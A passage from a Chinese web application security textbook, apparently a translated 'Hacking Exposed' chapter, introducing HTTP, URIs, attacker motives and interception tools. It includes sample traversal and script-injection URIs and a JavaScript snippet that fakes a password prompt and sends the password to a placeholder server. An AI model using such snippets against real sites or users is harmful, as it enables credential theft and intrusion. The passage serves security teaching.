## 第 1 章 Web 应用攻击的基础知识

本章对“何人，何事，何时，何地，如何，以及为什么”（who，what，when，where，how，and why）进行 Web 应用攻击作了一个简要的概述，为本书后面的章节做铺垫。在后面的章节中，我们会更深入地研究 Web 应用程序的攻击和对抗措施细节。在本章中，我们也会介绍基本的 Web 应用攻击工具，因为出于各种各样的目的，这些工具的使用会贯穿于本书的其他部分。

### 1.1 什么是 Web 应用攻击

我们不会花太多的时间来定义“Web 应用”（web application）。除非在过去的十年中你是生活在原始森林里的，那么或许你都已经亲身体验过许多 Web 应用程序了，比如搜索引擎 Google，购物网站 Amazon.com，电子邮箱 Hotmail 等等。在这里，我们只在所关注的地方停留，尽量快速简洁地给出仅与安全相关的一些词汇的定义。如果想知道更广泛的定义，可以在 Wikipedia.org 网站上查找关键词 “web application”。

我们把 Web 应用程序定义为一种能通过超文本传输协议（HyperText Transfer Protocol，即 HTTP）访问的程序。在本章末尾处的“参考和进一步阅读”中，可以找到 HTTP 的背景资料。因此，Web 攻击的本质，就是通过 HTTP 协议篡改应用程序。有三种简单的方法可以实现该目的：

通过 Web 的图形界面直接操纵应用程序。

☐ 通过统一资源标识（Uniform Resource Identifier，URI）篡改应用程序。

☐ 通过未包含在 URI 里的 HTTP 元素篡改应用程序。

#### 1.1.1 GUI Web 攻击

在很多人的印象里，Web 攻击是一项枯燥的技术，是那些习惯呆在黑暗屋子中，喝着

很多 Mountain Dew 的年轻人的最爱。但是，由于直观的图形用户界面（Graphical User Interface，GUI）的出现，Web 攻击技术并不一定是那么乏味了。

其实，Web 攻击可以十分简单。在第 7 章，我们会讨论 Web 应用攻击中最具破坏性的种类之一：SQL 注入（SQL Injection）。虽然 SQL 注入的本质有点复杂，但任何一个想寻找关于 SQL 注入基础知识的详细资料的人，都可以通过搜索网络而找到。通常，搜索结果会展示如何执行一个简单攻击，该攻击能够绕过编写不严谨的 Web 应用的登录界面，具体攻击方法是输入一组简单的字符串，使得登录函数每次都返回——“登录成功”。图 1-1 显示了执行这组攻击是多么的简单，图中使用的图形用户界面是 Foundstone 公司的 Hacme 银行 Web 例样程序。

 </div>

一些挑剔的人肯定会嘲讽只使用浏览器进行“真正”的 Web 应用攻击的想法，我们的确也会在本章后半部分和全书各处介绍许多工具，这些工具拥有比基本的 Web 浏览器更强大的功能，可以发起工业级攻击；但是，请不要过于轻视 Web 浏览器！我们多年的 Web 应用攻击经验表明，黑客真正想攻击的是应用程序的基本逻辑，而与所使用的工具无关。事实上，我们看见过很多非常优雅的攻击，使用的都仅仅是浏览器而已。

从好一点的方面来想，这类 GUI 攻击或许可以极大地促使 Web 应用程序的管理员、开发者、项目经理和主管修补问题。通常情况下，展示漏洞的严重后果的最好方法，就是演

示漏洞是如何被所有人都熟悉的工具所攻击的。

#### 1.1.2 URI 攻击

希望深入讨论黑客技术的朋友们，我们继续吧。

提起 URI，任何一个在过去 5 年中使用过电脑的人，都会立即想起统一资源标识符（Uniform Resource Identifier，URI）的常见例子——在网上冲浪时所用浏览器的地址栏上的文本字符串，就是像 http://www.somethingorother.com 这样的内容。

RFC 2396 从技术方面描述了 URI 的结构和语法，也描述了其他的一些子类，包括更常使用的术语——统一资源定位符 URL（Uniform Resource Locator，URL）。在 RFC 2396 中，URI 由下面几段构成：

scheme: //authority/path?query

将其解释成更通俗的用语就是，URI 描述了访问位于服务器（authority）上的资源（path）或应用程序（query）所采用的协议（scheme）。对于 Web 应用程序来说，协议基本上都是 HTTP，要不然就是 HTTP 的“安全”版本 HTTPS，在 HTTPS 中，会话数据被 SSL 或 TLS 协议保护，更多的信息请参见“参考和进一步阅读”。

警告 标准的 HTTPS 没有客户端认证，除了使得窃听和干扰客户端和服务端间的流量变得更加困难外，对 Web 应用的整体安全性并没有什么作用。

在这里，服务器（server）是运行 HTTP 软件的一台或多台计算机，通常用 www.somesite.com 一类的 DNS 名指定；路径（path）描述了应用程序文件所处的文件夹或目录层次；查询（query）包含了提交给服务器上的可执行程序的参数。

 $ \underline{\text{URI 中问号（？）右方所有的内容都被称为查询字符串。}} $

HTTP 客户端（通常是 Web 浏览器）只不过请求这些资源，然后服务器作出响应。在 Web 浏览器上，我们已经见过无数次这样的操作，就不再作冗长的分析了。下面是一些具体的例子。

http://server/file.html

http://server/folder/application?parameter1=value1&parameter2=value2

http://www.webhackingexposed.com/secret/search.php?input=foo&user=joel

之前我们已经提到过，Web 攻击只不过是用巧妙的方法操纵 URI，下面就是一些操纵 URI 的简单例子。

https://server/folder/.../.../.../cmd.exe

http://server/folder/application?parameter1=aaaaa...256 a's...]

http://server/folder/application?parameter1=<script>='alert</script>

如果你能猜出上面的每个攻击在做什么，那么你已经是 Web 攻击方面的专家了；如果你并不是十分清楚也不要紧，一会儿我们将作图形化的演示。首先，我们对一些更多的细节问题进行阐述。

#### 1.1.3 请求方法、请求头和数据体

在 URI 的背后，还有一些其他的东西（但不是太多）。HTTP 是无状态的请求/响应协议，除了在 URI 中出现的信息外（所有“协议://域”右方的内容），还有请求中所使用的请求方法、几种协议头，以及数据体中传送的数据。这些在 URI 中都是不可见的，但它们对理解 Web 应用程序非常重要。

HTTP 的请求方法（method）指明了在目标资源上所执行操作的类型。在 HTTP 的 RFC 中定义了几种请求方法，而在 HTTP 的扩展——Web 分布式创作和版本控制（Web Distributed Authoring and Versioning，即 WebDAV）中定义了更多的请求方法。但是大多数 Web 应用程序仅使用两种请求方法：GET 和 POST。GET 请求服务器上的信息。GET 与 POST 都可以给服务器传送信息，它们最重要的一个区别是：GET 把所有的数据都放在 URI 中，而 POST 把数据放在请求的数据体中（在 URI 中不可见）。POST 通常给应用程序提交表单数据，比如在线购物系统中询问姓名，邮寄地址以及支付方法等。这里有个常见的误解，就是因为 POST 的数据在 URI 中不可见，就假定 POST 方法比 GET 方法能更好地保护数据。虽然用 GET 方法发送的请求串中包含了诸如客户端缓存和 Web 服务器日志等敏感信息，的确更有可能泄漏数据，但我们在本书中无数次的演示表明，POST 比 GET 更安全的假设是完全错误的。

HTTP 请求头（header）通常用来存储关于传输协议层的额外信息。一些和安全相关的 HTTP 请求头包括如下几个。

o 授权（Authorization）：指明请求是否使用了某种类型的认证，这种请求在很多情况下还同时作为诸如基础验证（Basic authentication）的授权数据。

- 缓存控制（Cache-control）：指明请求的副本是否需要被缓存在中间的代理服务器上。

- Referer（根据 HTTP RFC 规范，是故意这样拼写错的）：列出了浏览器是从什么 URI 源来到当前链接的。有时用在简单的认证机制中，但很容易就会被突破。

- Cookies：通常用来保存应用程序自己编写的认证/会话令牌。在本书中，我们会非常多地谈及它们。

下面是一个利用流行工具 netcat 观察 HTTP 背后信息的例子。我们首先连接到 www.test.com 服务器的 TCP 80 端口（HTTP 协议的默认端口，而 HTTPS 的默认端口是 TCP 443），然后我们请求资源/test.html。该请求的 URI 其实就是 http://www.test.com/test.html。

C:\>nc -vv www.test.com 80
www.test.com [10.124.72.30] 80 (http) open
GET /test.html HTTP/1.0
HTTP/1.1 200 OK
Date: Mon, 04 Feb 2002 01:33:20 GMT
Server: Apache/1.3.22 (Unix)
Connection: close
Content-Type: text/html
<HTML><HEAD><TITLE>TEST.COM</TITLE>etc.

在这个例子中，很容易看到请求中的请求方法（GET），响应头（如 Server 等），以及响应数据体数据（如<HTML>等）。通常情况下，黑客们不必为了成为专家而对 HTTP 了解到如此细致的水平——他们只需要使用几种现成的工具，自动完成所有这些底层的工作，并且在需要时，对数据进行操纵。我们将在下一节“‘如何’攻击 Web 应用”中，对其进行图形化演示。

#### 1.1.4 资源

典型情况下，攻击者的最终目的是获得对 Web 应用程序的资源（resources）的未授权访问。那么，Web 应用包含哪些类型的资源呢？

虽然，Web 应用可以分为很多层（通常被称为“tiers”），但大部分的 Web 应用程序只有三层：表示层（presentation）、逻辑层（logic）和数据层（data）。表示层通常为超文本标记语言（HyperText Markup language，HTML）页面，它或者是静态页面或者由脚本动态生成。它们通常没有包含对黑客有用的信息（至少不是有意的包含，在本书中我们也会看到一些例外）。对逻辑层来说，虽然 Web 应用开发者经常会在该层产生错误，导致应用程序的其他方面受到攻击，但在这一层也没有对黑客有用的信息。而在数据层，则有很多有价值的信息，比如客户数据，信用卡号码等等。

这些层是如何映射到 URI 上的呢？通常情况下，表示层由静态 HTML 文件或动态生成 HTML 的脚本组成，比如：

http://server/file.html（静态 HTML 文件）

http://server/script.php（一个超文本预处理器或者 PHP 脚本）

http://server/script.asp（微软活动服务器网页 Active Server Pages，ASP 脚本）

http://server/script.aspx（微软 Asp.NET 脚本）

动态脚本也可认为是在逻辑层上，用来接收输入参数和值，比如：

http://server/script.php?input1=foo&input2=bar
http://server/script.aspx?date=friday&time=1745

很多应用程序也使用单独的可执行文件来接收输入参数和值。因此，你看到的并非是脚本文件，有可能是类似这样的形式：

有许多像这样的 tier-2 逻辑应用程序开发框架，最常见的包括微软的 Internet 服务应用编程接口（Internet Server Application Programming Interface，ISAPI）规范和公共网关接口（Common Gateway Interface，CGI）规范。

无论 tier-2 逻辑是用什么类型实现的，总需要在第 3 层访问数据。因此，典型情况下，第 3 层是某种类型的数据库，通常为一个 SQL 变量。因为 SQL 有自己的语法，常常会被表示层和逻辑层以不恰当的方式暴露出来，这就为攻击者创造了从应用程序操纵和获取数据的单独机会。我们会在第 7 章 Web 数据存储中作图形化演示。

#### 1.1.5 认证，会话和授权

HTTP 是无状态的——协议本身并没有维护会话状态，也就是说，如果你请求了一个资源并收到了一个合法的响应，然后再请求另一个资源，服务器会把其当作是完全分离和独立的请求。HTTP 不会维护任何像会话一样的东西，也不会与客户端一起维护链接的完整性。这一点也为攻击者提供了方便，因为不需要计划多个阶段的攻击来模拟复杂的会话维护机制——一个单独的请求就可以击垮 Web 应用程序。

不过从好一点的方面来想，Web 开发者已经在尝试克服基本协议的缺陷，加入他们自己的认证、会话管理和授权功能，通常的做法是实现一些认证，然后在 Cookie 中写入认证/会话信息。我们会在专门讲解认证的第 4 章和讲解授权的第 5 章（也包括了会话管理）中看到，这种处理方式为攻击者们提供了可反复利用的机会。

#### 1.1.6 Web 客户端和 HTML

如果遵照我们对 Web 应用的定义，那么 Web 应用的客户端就是任何能够理解 HTTP 的工具。最正统的 Web 应用客户端是 Web 浏览器，它在各种协议中选择 HTTP 进行交流，在各种标记语言中采用超文本标记语言（HyperText Markup Language，HTML）。

和 HTTP 类似，Web 浏览器也相当的简单。由于 HTML 具有可扩展性和变体，可以在

看似静态的 Web 内容中嵌入大量的功能。比如，在 HTML 中嵌入可执行的 JavaScript 就相当简单：

<html>
<SCRIPT Language="Javascript">var password=prompt
('Your session has expired. Please enter your password to continueினیا', '');
location.href="https://10.1.1.1/pass.cgi?passwd="+password;</SCRIPT></html>
</script>

把这个文本复制到名为“test.html”的文件中，并在你的浏览器中运行它，就可以看到这些代码做了什么。很多其他危险的内容也可被嵌入到 HTML 中——包括脚本、ActiveX 程序、远程图片“Web 漏洞”，以及任意层叠样式表（Cascading Style Sheet，CSS）等，都可以像我们刚才演示的那样，只用纯的 ASCII 文本，就可以在客户端上进行恶意操作。

当然，就像许多攻击者指出的那样，只要让终端用户点击一个 URI，攻击者也可以完全控制他的机器。这从 Web 客户端的角度再次证明了 URI 的威力。另外，不要忘记那些文本中看似无害却指向可执行代码的字符串。

最后，我们会在下一节中讲述诸如 Ajax 和 RSS 等强大的新技术，可以看到，它们其实只是增加了 Web 客户端解析输入数据的复杂性。

我们会在第 10 章对所有的相关内容进行进一步的探讨。

#### 1.1.7 其他协议

HTTP 看起来很简单——但令人惊异的是,那些极富创造力的人几乎都没有摆脱它的基本请求/响应机制。但是,这并不总是应用程序开发问题的最好解决方案。因此,仍有很多更赋创造力的人,将基本的协议封装在一大堆新的动态功能之中。

最近添加的一种重要的协议是 Web 分布式创作和版本控制（Web Distributed Authoring and Versioning，即 WebDAV）。WebDAV 在 RFC 2518 中定义，描述了几种能在远程 Web 服务器上创作和管理内容的机制。我们个人认为这不是个好主意，因为在默认方式中，协议可以往 Web 服务器上写入数据，这只会带来问题。这一点我们会在本书中反复看到。然而，WebDAV 已被微软所支持，而且已经存在于他们广泛配置的产品之中，因此这里讨论它的安全性可能还没有实际意义。

在更近些时候，基于 XML 的 Web 服务观念变得流行起来（虽然一些人会认为它的流行度已经减弱了）。虽然在使用标记定义文档元素方面，可扩展标识语言（eXtensible Markup Language，XML）和 HTML 非常的相似，但是 XML 担当了更多幕后的角色——它定义了应用程序之间的通信机制和协议。简单对象访问协议（Simple Object Access Protocol, SOAP）

就是 Web 服务之间，基于 XML 进行消息和 RPC 通信的一种协议。我们会在第 8 章中讨论 Web 服务漏洞和对抗措施。

还有一些其他有趣的协议，比如 Ajax（Asynchronous JavaScript and XML，异步 Javascript 和 XML）和 RSS（Really Simple Syndication，简易信息聚合）。Ajax 是一种新的 Web 应用程序编程方法，它使用轻量级的 JavaScript 和 XML 技术，建立“胖客户端”体验。因此 Ajax 已被一些人称为“Web 2.0”的基础。如果想知道 Ajax 能做什么，可以查看 http://www.live.com 站点。我们已经注意到，客户端上的可执行内容有潜在的安全问题，这个问题会在第 10 章中更深入的阐述。

RSS 是一种轻量级的基于 XML 的机制，可以动态改变 Web 站点和客户端间的“标题”。我们再次引用 http://www.live.com 作为例子，上面提供了 RSS 读者工具，你可以在个人主页上嵌入它，把你喜欢的 RSS 聚集到一个地方。RSS 有非常巨大的潜在安全问题——RSS 接受来自无数地方的任意 HTML 内容，并盲目地重新发布。从我们先前的讨论中已经看到，HTML 可以携带危险的内容，这给 Web 浏览器保证各种情况下的运转安全带来了非常大的负担。

### 1.2 为什么攻击 Web 应用

发起攻击的动机有很多，关于它的讨论也在各种论坛上持续了多年。我们不准备重复这些讨论了，但我们确实认为，指出一些吸引攻击者的 Web 应用的特性是很重要的事情。明白了这些因素后，可以更清楚地了解需要设置什么样的防范措施以减轻风险。

广泛性：今天，Web应用程序几乎无处不在，而且还在公共网络和私有网络中极快地扩展。一时半刻，Web黑客们是不会遇到攻击目标缺乏的问题的。

技术简单性：即使对懒人来说，Web应用攻击技术都真的是太容易理解了，因为它们基本上都是基于文本的，这使得操纵应用程序的输入非常简单。与攻击更复杂的程序或者操纵系统（如缓冲区溢出攻击）所需要的知识相比，攻击Web应用程序只不过是小菜一碟。

匿名性：现在 Internet 上仍有存在许多无法追究责任的地方，这使发起不会被追查到的攻击非常容易。特别是 Web 攻击，很容易通过公开的 HTTP/S 代理发起（这些代理通常是不知情的），这些代理在现今网络上是非常多的。更高级的黑客甚至可以将各个请求通过不同的代理发送，从而使得追查变得更加困难。由此可见，匿名性是恶意攻击不断增多的主要原因，因为在现实社会中，做同样的事情会受到逮捕和处罚，但网络的匿名性使其失去了惩罚的威慑力。

☐ 防火墙的可绕过性：入方向的 HTTP/S 几乎被所有的防火墙策略所允许（这不是防

火墙的漏洞——这是管理员配置的策略）。令攻击者更欣喜的是，由于越来越多的应用程序移到了 HTTP，这样的配置可能会不断地增多。你已经看到，通过 Web 共享家庭照片，私人博客以及电脑上“web 共享文件夹”等功能，这种配置变得越来越流行了。

o 定制代码的脆弱性：由于 ASP.NET 和 LAMP（Linux/ Apache/ MySQL/ PHP）之类的易获取的 Web 开发平台不断增多，大部分 Web 应用程序都是由没什么经验的开发人员开发的。这再次说明了 Web 技术非常容易理解，进入的门槛非常低。

安全的不成熟性：HTTP 甚至没有实现会话来区分不同的用户。在认证和授权技术流行这么多年后，HTTP 的基础认证和授权现在仍在发展之中。许多开发人员编写出自己的认证代码，遗憾的是，他们的认证代码是错误的（虽然这一点会随着现成的带有授权/会话管理的 Web 开发平台越来越多的出现而改变）。

不断的变化性：通常情况下，有很多人会经常接触到 Web 应用：开发人员，系统管理员和版块的内容管理员（我们看到过许多公司，他们的市场团队可以直接访问产品 Web 页面）。这些人中只有很少人进行过充分的安全培训，却被赋予权利对复杂的、面向 Internet 的 Web 应用进行随时的更改（我们曾见过每小时更改一次）。从这一点来说，对简单的更改流程管理就很难做到，更不用说保证执行始终如一的安全策略了。

利益性：尽管.COM时代还没有完全来临，但在可预期的未来，HTTP上的电子商务会支持许多能赢利的业务。因此不必感到吃惊，最近的统计数据表明，随着Web的成熟，Web攻击的动机也从出名转向了谋利。司法机关公布的有组织地进行Web应用攻击、谋取利益的犯罪团伙越来越多。无论是通过直接攻击Web服务器，还是直接欺骗Web终端用户（也称为钓鱼，Phishing），或者使用拒绝服务攻击进行敲诈，这些糟糕的情况都是因为Web犯罪是可以获得利益而导致的。

### 1.3 何人、何时、何地攻击 Web 应用

我们的目标是讲述“如何”进行 Web 攻击。但为了完成我们的讨论，再用几段话描述“何人、何时、何地”攻击 Web 应用。

就像 “为什么” 攻击 Web 应用一样，定义 “何人” 攻击 web 应用像是要瞄准一个不断移动的目标。放暑假时，离开学校的无聊的年轻人可能是 Web 攻击的主体，他们通过攻击 Web 站点，相互进行比赛。我们先前提到了，Web 攻击现在是一个很严重的问题，有组织的犯罪团伙正在成为 Web 攻击并获取利益的最大源头。

回答“何时”和“何地”攻击 Web 应用，则相当的简单：24 小时×7 天，任何地方（甚至网络内部）。Web 应用吸引人之处是它们“总向公众开放”的本质，这也将它们或多或少地暴露在风险面前。更有趣的是，我们是按照 Web 应用的“哪些位置”会被攻击来讨论“何地”攻击 Web 应用的。换句话说，常见的 web 应用安全薄弱点是在那里呢？

#### 1.3.1 安全薄弱点

如果你回答 “全部”，那么你已经熟悉这个问题的招式了，同时，你的回答也是正确的。下面简要地列出了典型的攻击类型，这些攻击类型针对我们讨论过的 Web 应用的各个组件。

- Web 平台：Web 平台软件漏洞，包括 HTTP 底层服务器软件（比如，IIS 或 Apache）等底层基础设施，以及应用程序开发框架（如 ASP.NET 或者 PHP），请参见第 3 章。

- Web 应用：对授权、认证、站点结构、输入验证、程序逻辑以及管理接口进行攻击。

在本书的第 4 章到第 9 章，第 12 章和第 13 章中会涉及。

数据库：通过数据库查询运行特权命令，操纵查询以返回额外的数据集，这里最具破坏性的攻击是 SQL 注入，我们会在第 7 章中讨论。

- Web 客户端：活动内容执行、客户端软件漏洞攻击、跨站脚本错误，以及钓鱼欺骗。

Web 客户端攻击将在第 10 章讨论。

- 传输：窃听客户-服务器通信，SSL 重定向。在本书中我们不涉及这方面的内容，因为这属于通信层的攻击，在网上已经有一些这方面很好的文章了。

可用性：如果要你迅速地指出更危险的“黑客”技术，拒绝服务攻击（denial of service，DoS）经常会被遗漏，其实DoS攻击是任何可公开访问的Web应用所面临的最大威胁之一。让任何资源都对公众开放本来就有很大的挑战，在网络世界中更是如此。在这里，分布的僵尸机器军团可以被匿名攻击者集结起来，对任何一个Internet上的目标发动一次空前的请求风暴。在第11章会集中讨论DoS攻击及其对抗措施。

虽然关于何种 Web 应用组件最常受到攻击还没有可靠统计,但已有一些非正式的调查。其中 Open Web Application Security Project（OWASP）就是最流行的之一, OWASP 列出了被安全界广泛认可的前 10 个的最严重 Web 应用程序安全漏洞列表。

### 1.4 如何攻击 Web 应用程序

吃够了开胃小菜，正餐开始了！

从本章中你可能已经意识到了，查看和操纵图形化的原始 HTTP/S 的能力是绝对需要的。没有这样的能力，就无法进行恰当的 Web 安全评估。所幸的是，很多工具都有这样的功能，而且绝大多数都是免费的。在本章的最后一节，我们会提供一些常用工具的简介，这样你可以和我们一起用它们测试书中各处的例子。在本章末尾的“参考和进一步阅读”一节中，列出了下面讲述的每个工具的网址。

注意 关于 Web 应用程序自动安全扫描工具的介绍可以在第 13 章中找到, 这里讨论的是监测和操纵 HTTP/S 的基础工具。

我们将在本节中讨论一些 HTTP 分析工具和篡改工具，包括：Web 浏览器，浏览器扩展，HTTP 代理和命令行工具。我们将从 Web 浏览器开始介绍，但并不意味着它是我们处理 HTTP 时的偏爱。总的说来，当谈到 HTTP 分析时，我们认为浏览器扩展最好地结合了强大的功能而且易于使用；但在有些情况下，命令行工具可能会为工作提供更方便的脚本化功能。通常，大多数攻击都是利用几种工具的最佳特性来完成的。因此，我们尽量全面地讲述这些工具；同时也基于实际测试情况，清晰地指出什么工具是我们最喜欢的。

#### 1.4.1 Web 浏览器

没有什么工具比浏览器更为基础的了。有的时候，你仅仅需要浏览器这个工具就能进行优雅的 Web 应用攻击。在本章刚开始，我们就已看到，只利用 Web 应用程序自身的图形用户界面，就可以发动简单但极具破坏力的攻击，比如有效绕过登录验证的 SQL 注入（参见图 1-1）。

当然，你同样可以篡改浏览器地址栏中的 URI 文本，然后单击 “发送” 按钮。图 1-2 中演示了这样做是何等的容易，图中显示了在 Foundstone 的 Hacme 银行例样程序上，如何从银牌权限提升到白金权限。

当然，事情总不会是那么简单的，对吧？浏览器有两个基本的不足：第一，浏览器在背后自己篡改了URI（例如，IE的转义字符圆点、斜杠等）；第二，你不能从浏览器地址栏中修改PUT请求的内容。不错，你可以将页面保存在本地，编辑后再提交，但是谁想花费如此多的时间来分析非常大型的应用程序呢。这个问题的简单解决方法是基于浏览器扩展的HTTP篡改工具，也是接下来我们将讨论的内容。

 </div>

#### 1.4.2 浏览器扩展

浏览器扩展是流行的 Web 浏览器上的轻量级插件。它能在浏览器界面中对 HTTP 进行分析和篡改。浏览器扩展是或许是我们手工篡改 HTTP/S 时最喜欢的方法，它们的主要优点包括：

- 与浏览器的集成性：这给分析者一种从应用程序的真实使用者出发的直观感。浏览器扩展也使得配置变得更为简单，比如，HTTP 代理一般需要单独的配置将其打开和关闭，而有了浏览器扩展，一个按键就可以完成。

透明性：浏览器扩展基于浏览器的基本功能之上，使得它们能无缝地处理经过浏览器的任何数据。这对 HTTPS 连接来说是特别重要的，HTTPS 连接经常需要独立的代理来处理不同的功能。

接下来,我们列举出当前可用的浏览器扩展工具。首先列出的是 IE 扩展,然后是 Firefox 扩展。

##### IE 扩展

下面是用来作 HTTP 分析和篡改的 IE 扩展。按照我们的偏好程度列出，并且将最推荐的放在第一位。

TamperIE: TamperIE 是来自 Bayden 系统的一种浏览器辅助对象（Browser Helper Object, BHO）。它非常简单，只有两个选项——篡改 GET 和/或 POST。在默认情况下，设置为仅篡改 POST，所以当你在浏览时遇到 POST 请求时（比如提交表单或购物车订单），

TamperIE 会自动阻断提交并在屏幕上显示出来，如图 1-3 所示。从屏幕上可以看到，关于 HTTP 请求的所有内容都可以被篡改。POST 请求可以用 “美观”（pretty）模式或 “原始”（raw）模式进行查看，两种模式都可以对数据进行编辑。图 1-3 显示了一种直接的攻击，在提交购买请求前，HTTP Cookie 中的价格项被改变了。这个例子是 Bayden 系统的 “沙盒”（sandbox）Web 购物应用程序提供的，其链接参见本章最后的 “参考和进一步阅读”。

如果你思考一下，就会发现 TamperIE 是手工攻击 Web 应用所需要的唯一工具。它的 GET 篡改功能可以绕过浏览器强制的任何限制，它的 PUT 篡改功能可以篡改 HTTP 请求报文体中的数据，这些都是通过浏览器的地址栏所不能实现的（当然，你可以保存为本地页面，然后再提交，但这也太老套了！），我们喜欢那些能很好完成实质工作的工具，不需要那些花哨的附加功能。

 </div>

IEWatch IEWatch 是简单但功能完整的 HTTP 监控客户端，它可以作为浏览器栏集成在 IE 中。当将其加载进行 HTTP 或 HTML 分析时，它会占据在浏览器窗口的下方的位置。不过它的位置不是固定的，可以被调整到任何合适的地方。IEWatch 把 HTTP 和 HTTPS 交互的所有方面都暴露了出来，包括请求头、表单、Cookie 等等，都可以通过简单双击输出日志中的对象进行详细的分析。比如，双击 IEWatch 日志记录中的 Cookie，会弹出一个新的窗口，显示 Cookie 中的每个参数和值。这非常有用！这个工具唯一的不足之处在于，它只能查看数据，不允许篡改数据。图 1-4 中显示 IEWatch 正在分析一系列的 HTTP 请求/响应。

IE Headers Jonas Blunck 的 IE Headers 提供了与 IEWatch 类似的基本功能, 但可视化

方面做得不像 IEWatch 那么好。和 IEWatch 一样，IE Headers 也是一个位于浏览器底部的浏览器栏。当你在网上冲浪时，IE Headers 会显示 IE 发送和接收的 HTTP 头。它也不允许篡改数据。

 </div>

##### Firefox 扩展

下面是用做 HTTP 分析和篡改的 Firefox 扩展，按照我们的偏好程度列出，并且将最推荐的放在第一位。

LiveHTTPHeaders LiveHTTPHeaders 是由 Daniel Savard 提供的 Firefox 插件，它可以将原始的 HTTP 和 HTTPS 流导入到浏览器界面的一个单独的工具条中，也可以打开一个单独的窗口（当从“工具”菜单中启用时）。LiveHTTPHeaders 也会在 Firefox 的“工具”中添加“Headers”标签。LiveHTTPHeaders 是我们进行 HTTP 篡改时最喜欢使用的浏览器扩展。

LiveHTTPHeaders 显示原始的 HTTP/S 或者每个请求/响应。LiveHTTPHeaders 的重放

特性也允许对数据进行篡改。只要简单选择想重放的 HTTP/S 请求记录，然后单击“重放”按钮（只有通过“工具”菜单启用的 LiveHTTPHeaders 才能使用这个按钮），所选择的请求就会在另一个窗口中显示。在那个窗口里，所有的请求都是可被编辑的，攻击者可以编辑请求中任何他们想改变的部分，然后单击“重放”按钮，新的请求就被发送了。图 1-5 显示 LiveHTTPHeaders 在重放一个 POST 请求，其中，用户代理（User-Agent）头被修改成了一般的字符串，有时这个简单的修改可以用来绕过 Web 应用程序的认证，我们会在第 5 章中进行演示。

 </div>

TamperData TamperData 是由 Adam Judson 编写的 Firefox 扩展，允许跟踪和修改 HTTP 和 HTTPS 请求，包括请求头和 POST 参数。TamperData 可以作为工具条或者独立的窗口被加载。篡改功能可以在任何地方打开，一旦设置为“篡改”，Firefox 将对每个请求弹出对话框，提供对请求的“篡改”，“提交”或“终止”选项。选择“篡改”选项，会给使用者呈现一个如图 1-6 所示的界面，在该界面中，HTTP/S 请求的每个地方都可被修改。在图 1-6 的例子中，我们将 HTTPS POST 的值篡改为“管理员”（admin），这是另外一种绕过 Web 应用安全机制的常用技巧，我们会在第 5 章中更详细地讨论。

虽然 LiveHTTPHeaders 和 TamperData 提供的基本功能类似，但我们更喜欢 LiveHTTPHeaders 一些，因为它提供了更多“原始”数据编辑的接口。当然，这纯属于个人意见，在我们的测试中，这两种工具的性能是一样的。

Modify Headers 另一种可用来修改 HTTP/S 请求的 Firefox 扩展是 Gareth Hunt 的 Modify Headers。和修改每个请求相比，Modify Headers 更适合做永久的更改。比如，如果你想永久地改变浏览器的用户代理串或 Cookie，Modify Headers 就比 TamperData 更适合，

因为你不必费力地处理无数弹出的窗口，然后改变每个请求。两个工具可以协同使用：使用 TamperData 在请求实验中决定设置什么样的值，然后使用 Modify Headers 在整个会话中设置成一直发送该值，从而自动化地管理攻击。

 </div>

#### 1.4.3 HTTP 代理

HTTP 代理是那些可以中断 HTTP/S 通信, 使得攻击者在请求提交前能够分析或者伪造数据的程序。攻击者通过运行本地 HTTP 服务, 把本地 Web 客户端重定向到该服务（通常通过将客户端的代理配置为本地的 TCP 高端端口, 如 8888, 来实现）, 以此来分析或伪造数据。这里的本地 HTTP 服务, 即代理, 扮演了 “中间人” 的角色, 允许分析和伪造任何通过它的 HTTP 会话。

HTTP 代理比浏览器扩展或多或少有更大的动静，主要是因为它们需要中断 HTTP 的正常流。当需要对付 HTTPS，特别是带有客户认证的 HTTPS 时，这显得更加明显。一些代理天生就不能正常处理 HTTPS。而之前我们已经看到，浏览器扩展不需要考虑这个问题。

另外，HTTP 代理能够分析和篡改非浏览器的 HTTP 客户端，而那些基于浏览器扩展的工具显然是不能实现这个功能的。

总的来说，我们更喜欢基于浏览器的工具，因为通常它们更易使用，而且让你更接近应用程序的原本流程。尽管如此，我们仍在下面列出当前可以使用的 HTTP 代理工具。同样，按我们的偏好程度列出，并且将最推荐的放在第一位。

##### Paros 代理

Paros 代理是一个免费工具箱，包括了 HTTP 代理、Web 漏洞扫描器和网络爬行/网络蜘蛛（crawling / spidering）等模块。Paros 代理是用 Java 编写的，因此要运行它，需要从 http://java.sun.com 上安装 Java 运行库（Java Runtime Engine，JRE）。Sun 公司也提供了许多包含了 JRE 的开发工具包，但它们包含了运行 Paros 代理这个 Java 程序并不需要的额外组件。Paros 已经出现了一段时间，是当今最流行的 Web 应用安全评估工具之一。

这里我们重点介绍 Paros 的 HTTP 代理，它是一个相当好的分析工具，能够透明地处理 HTTPS，并且提供简单的“安全人员”使用模式。该模式能够捕获请求和/或响应，允许轻易地篡改任一方向的 HTTP 传输数据。图 1-7 显示 Paros 正在伪造 Bayden 系统的样例购物应用程序的“费用”字段，现在该字段已经是臭名昭著了。

因为简单且功能完善，Paros 在我们的 HTTP 代理列表中是名列前茅的。它还具有拦截带有客户端认证支持的 HTTPS 的功能。当然，通过注入代理的“中间人”证书进行 HTTPS 拦截时，会弹出烦人的“验证证书”对话框，但这是使用 HTTP 代理技术的代价。

 </div>

##### OWASP WebScarab

或许没有其他的工具可以和 OWASP 的 WebScarab 如此丰富的功能相媲美，如果非要列举一些其中有用模块，那么它们包括 HTTP 代理、网络爬行/网络蜘蛛（crawler/spider）、会话 ID 分析、自动脚本接口、模糊测试工具（fuzzer）、对所有流行 Web 格式（Base64、MD5 等等）的编码/解码工具，Web 服务描述语言（Web Services Description Language，WSDL）和 SOAP 解析器等。WebScarab 基于 General Public License（GNU）版本协议。和 Paros 一样是用 Java 编写的，因此安装它需要 JRE。

WebScarab 的 HTTP 代理提供了预期的功能（包括 HTTPS 拦截，不过和 Paros 一样有认证报警）。WebScarab 也提供了一些花哨的功能，比如 SSL 客户认证支持，十六进制或 URL 编码参数的解码，内置的会话 ID 分析和一键式 “完成该会话” 以增加效率等。图 1-8 显示 WebScarab 篡改隐藏的 “Cost” 字段，本章中在多处引用了该字段。

就基本的代理功能而言，WebScarab 和 Paros 差不多，但 WebScarab 为更懂技术的用户提供了更多的功能，并提供了对隐藏的底层更多的访问。但是，由于 Paros 更简单，我们仍推荐初学者在开始时使用它。

 </div>

Fiddler

Fiddler 是 Eric Lawrenc 和微软公司发布的免费工具，它是我们见到的非 Java 的最好的

